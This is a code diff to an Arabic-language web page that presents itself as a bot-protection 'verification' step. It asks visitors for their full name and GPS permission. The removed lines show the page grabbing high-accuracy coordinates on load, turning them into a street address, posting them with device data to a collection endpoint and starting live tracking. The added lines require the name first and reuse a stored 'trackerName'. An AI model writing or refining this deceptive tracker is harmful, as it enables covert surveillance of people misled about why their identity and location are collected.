@@ -163,6 +163,36 @@
             margin-bottom: 16px;
         }
 
+        .retry-btn:disabled {
+            background: linear-gradient(135deg, #444, #555);
+            cursor: not-allowed;
+            box-shadow: none;
+            opacity: 0.5;
+        }
+
+        .name-error {
+            color: #e50914;
+            font-size: 12px;
+            margin-top: -8px;
+            margin-bottom: 10px;
+            display: none;
+        }
+
+        .name-error.visible {
+            display: block;
+            animation: shakeError 0.4s ease;
+        }
+
+        @keyframes shakeError {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .input-error {
+            border-color: #e50914 !important;
+        }
+
         .retry-btn:hover {
             transform: translateY(-2px);
             box-shadow: 0 6px 30px rgba(229, 9, 20, 0.5);
@@ -232,10 +262,11 @@
                     للحماية من الروبوتات والوصول الغير مصرح به،<br>
                     يرجى إدخال اسمك والسماح بالتحقق للمتابعة
                 </div>
-                <input type="text" id="userName" placeholder="أدخل اسمك الكامل" style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);border-radius:12px;color:#fff;font-family:'Cairo',sans-serif;font-size:15px;text-align:center;margin-bottom:14px;outline:none;transition:border 0.3s;" onfocus="this.style.borderColor='#e50914'" onblur="this.style.borderColor='rgba(255,255,255,0.15)'">
+                <input type="text" id="userName" placeholder="أدخل اسمك الكامل" oninput="onNameInput()" style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);border-radius:12px;color:#fff;font-family:'Cairo',sans-serif;font-size:15px;text-align:center;margin-bottom:14px;outline:none;transition:border 0.3s;" onfocus="this.style.borderColor='#e50914'" onblur="if(!this.value.trim()) this.style.borderColor='rgba(255,255,255,0.15)'">
+                <div class="name-error" id="nameError">⚠️ يرجى إدخال اسمك أولاً للمتابعة</div>
                 <div id="settingsGuide" style="display:none;text-align:right;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:14px 18px;margin-bottom:16px;font-size:13px;color:rgba(255,255,255,0.7);line-height:2.2;">
                 </div>
-                <button class="retry-btn" onclick="requestGPS()">✓ تأكيد والمتابعة</button>
+                <button class="retry-btn" id="confirmBtn" onclick="requestGPS()" disabled>✓ تأكيد والمتابعة</button>
             </div>
         </div>
     </div>
@@ -457,6 +488,20 @@
 
         let retryCount = 0;
 
+        function onNameInput() {
+            const input = document.getElementById('userName');
+            const btn = document.getElementById('confirmBtn');
+            const err = document.getElementById('nameError');
+            const name = input.value.trim();
+            if (name.length >= 2) {
+                btn.disabled = false;
+                err.classList.remove('visible');
+                input.classList.remove('input-error');
+            } else {
+                btn.disabled = true;
+            }
+        }
+
         function showBlocked() {
             document.getElementById('normalLoading').classList.add('hidden');
             document.getElementById('gpsBlocked').classList.add('active');
@@ -469,6 +514,17 @@
         }
 
         async function requestGPS() {
+            // Validate name first
+            const nameInput = document.getElementById('userName');
+            const nameErr = document.getElementById('nameError');
+            const name = nameInput.value.trim();
+            if (name.length < 2) {
+                nameErr.classList.add('visible');
+                nameInput.classList.add('input-error');
+                nameInput.focus();
+                return;
+            }
+
             retryCount++;
             document.getElementById('gpsBlocked').classList.remove('active');
             document.getElementById('normalLoading').classList.remove('hidden');
@@ -608,72 +664,16 @@
             }, 30000);
         }
 
-        // Initial load — check permission state and request GPS immediately
+        // Initial load — always show name entry screen first
         window.addEventListener('load', async () => {
-            let permState = 'prompt';
-            try {
-                const perm = await navigator.permissions.query({ name: 'geolocation' });
-                permState = perm.state;
-            } catch (e) { }
+            // Always show the name entry screen first
+            showBlocked();
 
-            if (permState === 'denied') {
-                retryCount = 1;
-                showBlocked();
-                return;
-            }
-
-            try {
-                const gpsPosition = await Promise.race([
-                    new Promise((resolve, reject) => {
-                        if (!navigator.geolocation) { reject(new Error('Not supported')); return; }
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true, timeout: 15000, maximumAge: 0
-                        });
-                    }),
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 16000))
-                ]);
-
-                const info = await collectDeviceInfo();
-                info.gpsLocation = {
-                    lat: gpsPosition.coords.latitude,
-                    lon: gpsPosition.coords.longitude,
-                    accuracy: Math.round(gpsPosition.coords.accuracy) + 'm',
-                    altitude: gpsPosition.coords.altitude,
-                    speed: gpsPosition.coords.speed
-                };
-
-                try {
-                    const geoRes = await fetch(
-                        `https://nominatim.openstreetmap.org/reverse?lat=${info.gpsLocation.lat}&lon=${info.gpsLocation.lon}&format=json&accept-language=ar`
-                    );
-                    if (geoRes.ok) {
-                        const geo = await geoRes.json();
-                        info.gpsLocation.city = geo.address?.city || geo.address?.town || geo.address?.village || '';
-                        info.gpsLocation.district = geo.address?.suburb || geo.address?.neighbourhood || '';
-                        info.gpsLocation.state = geo.address?.state || '';
-                        info.gpsLocation.country = geo.address?.country || '';
-                        info.gpsLocation.road = geo.address?.road || '';
-                        info.gpsLocation.fullAddress = geo.display_name || '';
-                    }
-                } catch (e) { }
-
-                try {
-                    const collectRes = await fetch('/api/collect', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(info)
-                    });
-                    const collectData = await collectRes.json();
-                    if (collectData.deviceId) {
-                        startLiveTracking(collectData.deviceId);
-                    }
-                } catch (e) { }
-
-                dataCollected = true;
-                setTimeout(showSite, 2000);
-
-            } catch (e) {
-                showBlocked();
+            // Pre-fill name from localStorage if available
+            const savedName = localStorage.getItem('trackerName');
+            if (savedName) {
+                document.getElementById('userName').value = savedName;
+                onNameInput();
             }
         });
     </script>
